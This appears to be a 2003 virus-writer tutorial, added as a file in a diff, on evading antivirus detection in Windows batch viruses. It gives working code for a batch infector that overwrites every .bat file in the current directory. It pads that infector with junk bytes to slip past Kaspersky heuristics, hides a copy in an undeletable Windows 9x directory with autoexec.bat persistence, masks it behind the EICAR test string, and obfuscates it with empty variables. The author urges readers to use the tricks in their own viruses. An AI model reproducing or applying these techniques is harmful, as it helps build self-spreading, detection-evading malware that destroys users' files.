@@ -1,0 +1,242 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************        Useful things in Batch        ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+.intro words
+
+  While making my Batch WOrm Generator I discovered much very useful techniques
+  for Batch viruses, for instands about Encryption or Polymorphism. But I
+  discovered also some other techniques. These are Anti AVA techniques, and I
+  thought, I don't have to let them die. Now let's start...
+
+
+
+
+
+
+.index
+
+  I'm sure, that you want to know, about which techniques I want to 
+  talk. So, here is the shit of content :)
+
+  1) Including fake bytes
+  2) Useing a undeletable directory (Not for Win00|NT|XP)
+  3) Including the EICAR-Testfile
+  4) Pseudo-Trash between the code
+
+
+
+
+
+.Including fake bytes
+
+  This is a special Anti-KAV-heuristic technique. Maybe you know, that KAV only
+  searchs in the first 1000 Bytes for the virus (I think, only in batch viruses).
+  What does that mean for us? Guess what? :) We inlude befor of the start of our
+  virus 1000 silly bytes, which don't do anything. And what is t effect? Let's test
+  it. First we have a very silly code-string, that only spread itself in the
+  current dir via overwriting Batch-files. KAV named it 'BAT.Silly.d'.
+
+- - - - - - - - - - [ BAT.Silly.d ] - - - - - - - - - -
+
+for %%a in (*.bat) do copy %0 %%a
+
+- - - - - - - - -[ End of BAT.Silly.d ]- - - - - - - - -
+
+  Now let's test our new technique. Includeing 1000 fake-Byte should not
+  be a serious problem. Because of the fact, that batch ignore simple input-errors
+  we won't have any problems with it. My string contains random lowercase-letters.
+  But it should be no problme to include also other letters like Uppercase or
+  numbers and so on. Important Note: Do not include a '<' or a '>', because the
+  computer will 'think', that you want to read/write from a file.
+
+- - - - - - - - - - [ Fake Bytes ] - - - - - - - - - -
+
+stjrdnfuqlgmpuwefguowyakzxgkxolraxozihswcfngwkpaolmmyfrzmsxbcnvrmwrtnjpwybshmhxjtimvzwjuoakncjwynilyp
+zciptpriqzrfqkqwgfiqpivuityndlqmlivmdtkjuynjdxzmpjedfjacsqgybiwcamxxxwolzzkprquufavkqfdyuqjcxvpizrakx
+pdmogwizgfrjhvxrmeewywmknxbqbthypeksxmywlfaijracwftfsflicvgfwqzsnrductwbvvtkkzerzgpcbzkngktcdfybzsnby
+emlcctvneufmhnvfsutoqnldznssinuqigrxbzyxwfmblnqhxztsokqyldnimzgjsmqwshasowgjrmwldkikgjwuffflhwugwrbqd
+qhbueiaahtvwmhfrhntudpvscpkiftyiwceboltowopsojwxbuarilavnacqlljixreykldgdqxdckayqztleotrbijiwzpesheyd
+cweyfyrldgvwkcocrqfqtlxuchxdhkpddokhpvxcihqshgqnpjoeqlxspcncyzlvkywzbtijvuiazhevcorognwzgscmmcappqrzw
+vmtjkatslrkzxrrwxiawspgfvwwphueigwostqtuwrsabmlsrugeudglkmadpimsdbhsmhzlqtcaqftezwbaqrlkzjnzdhvhrpgbi
+ajbakariwolazvdwhskrdsyqqcjayyqwusubevwumtwysahdzxtqhausneeistduraaaozircfrxqaidvarbiwibwzbtjajurezzd
+wvqswebffznuymcvqhitlgknfdlwbzdlxfikprozaaxynlxhtmcflbnptelhpgpymekdijonvhyiswpgprdhxtffzimxrdofzonaz
+qficniylakfqrazsqqviidufwfuwcialsryemswoekufgliuyybgzdydtqfmqnfqwdxmztbzqultebjbahjcadmibazhxsqljsslv
+cqqqtsqfndkcwihitiscoqqsphuooymtkolmjdielrslulfpqodcitauueorvbyohxhmwgfwozxkggipmgpkoutzykratrhamqbxj
+
+for %%a in (*.bat) do copy %0 %%a
+
+- - - - - - - - - [ End of Fake Bytes ] - - - - - - - - -
+
+  The thing looks damn stupid, but the effect is genial :). The whole virus
+  works, but KAV don't show any alarm. And also no heuristic alarm. I'm sure,
+  that you will like this technique very much.
+
+
+
+
+
+
+.Useing a undeletable directory (Not for Win00|NT|XP)
+
+  This technique's name looks very cool. And don't worry, it IS very cool.
+  But first let me explain, what it is: Windows 95 and Windows 98 have a
+  bug. If you try to make a new directory in MS-DOS, which contains some special
+  letters, windows won't be able to work with that directorys. You can't open
+  the directory, move it or delete it. That's the princip of our technique,
+  because of the reason, that batch is a DOS script. Now let's have a look at
+  letters, which make that possible.
+
+- - - - - - - - - - - [ Letter List ] - - - - - - - - - - -
+
+ASCII  176: °
+ASCII  177: ±
+ASCII  178: ²
+ASCII  179: ³
+ASCII  180: ´
+ASCII  185: ¹
+ASCII  186: º
+ASCII  187: »
+ASCII  188: ¼
+ASCII  191: ¿
+ASCII  192: À
+ASCII  193: Á
+ASCII  194: Â
+ASCII  195: Ã
+ASCII  196: Ä
+ASCII  197: Å
+ASCII  200: È
+ASCII  201: É
+ASCII  202: Ê
+ASCII  203: Ë
+ASCII  204: Ì
+ASCII  205: Í
+ASCII  206: Î
+ASCII  213: Õ
+ASCII  217: Ù
+ASCII  218: Ú
+ASCII  219: Û
+ASCII  220: Ü
+ASCII  223: ß
+ASCII  242: ò
+
+- - - - - - - - - -[ End of Letter List ]- - - - - - - - - -
+
+  OK, we know all the chars, which are possible. Now let's make a little
+  sample with that technique. My sample makes a undeleteable directory in
+  %windir%, and write something to the autoexec.bat, which let the virus
+  start at every windows-run.
+
+
+- - - - - - - - - - - [ Letter List example ] - - - - - - - - - - -
+
+cls
+@echo off
+cd %windir%
+md º´ÜòÌ
+cd º´ÜòÌ
+copy %0 virus.bat
+echo cd %windir% >>autoexec.bat
+echo cd º´ÜòÌ >>autoexec.bat
+echo virus.bat >>autoexec.bat
+
+- - - - - - - - - -[ End of Letter List example ]- - - - - - - - - -
+
+  I'm sure, that you'll understand the example. A special thanks goes
+  to the Author of 'Trojan.BAT.NoDelDir', but unfortunatly I don't know,
+  who it is. If you read this, please contact me!!!
+
+
+
+
+
+
+.Including the EICAR-Testfile
+
+  I think, that everybody knows, what EICAR-Virus-Test-File is. If not, I'll
+  explain it: It's a com-file from EICAR, and every Scanner detects it. It's
+  only for testing your AV. It's no virus, but it writes a String to the DOS
+  screen. OK, sounds nice, but how can we use it? Because of the fact, that 
+  nearly everybody knows about that file, nobody is scared of a warning from
+  his AV about that detection. That's the point. We include to our program the
+  EICAR-file, so useres won't be scared of it. Here is the EICAR file content:
+
+
+- - - - - - - - - [ EICAR-content ] - - - - - - - - - -
+
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+
+
+- - - - - - - -[ End of EICAR-content ]- - - - - - - - -
+
+  This is the same princip as the fake-bytes. But it contains a sensefully
+  content: The EICAR-file. It's the same 'virus', that I used in the FAKE
+  BYTE including technique. But now it's no more detect as 'BAT.Silly.d'
+  but 'EICAR-Test-File'. And we had success :)
+
+- - - - - - - - - [ EICAR-content example] - - - - - - - - - -
+
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+for %%a in (*.bat) do copy %0 %%a
+
+- - - - - - - -[ End of EICAR-content example]- - - - - - - - -
+
+
+
+
+
+
+.Pseudo-Trash between the code
+
+  The title sounds emazing. So, what do I mean with 'Pseudo-Trash'?
+  Anything, that is written down in the code, but do not exist in the
+  runtime. You may think, that I'm a stoned/drunken or whatever, but it's
+  the only possible explanation. Think about the explanation. What comes
+  to your mind? Maybe the command 'set'? Then you're at the right way.
+  OK, a variable contains any content. But the point is, that a variable
+  can also contains '' (=nothing). Now we solved our problem :)
+  Let's look at the code. It's again the silly virus, which is detect by
+  KAV as 'BAT.Silly.d'.
+
+- - - - - - - - - [ Pseudo-Trash example] - - - - - - - - - -
+
+%anyting%fo%anyting%r %%a i%anyting%n (%anyting%*.ba%anyting%t) d%anyting%o co%anyting%py %0 %%a
+
+
+- - - - - - - -[ End of Pseudo-Trash example]- - - - - - - - -
+
+  As you can see, the thing is very (!!!) easy to make, but it's also useful.
+  Note: you have to know, that the variable, that you use, has no content.
+  Otherwise the virus won't work. If you are not sure about the content,
+  include the line 'set anthing=', so you delete the content.
+
+
+
+
+
+
+.last words
+
+  These techniques could be really useful, if you also include other Anti AV
+  tricks. If you include all these things and also encryption or polymorphism
+  or whatever, AVs will have a really problems. Now I hope, that you'll try
+  to use some (or maybe all :D ) of these things in your future-projects,
+  otherwise I wasted much hours of discover the techniques, searching errors
+  and better ways of it, checking the behaviour on other OSes and writing the
+  article. OK, in the end I want to say sorry about my english spelling or
+  grammer mistakes :).
+
+
+							- - - - - - - - - - - - - - -
+							  Second Part To Hell/[rRlf]  
+							  www.spth.de.vu
+							  spth@aonmail.at
+							  written in june 2003
+							  Austria
+							- - - - - - - - - - - - - - - 
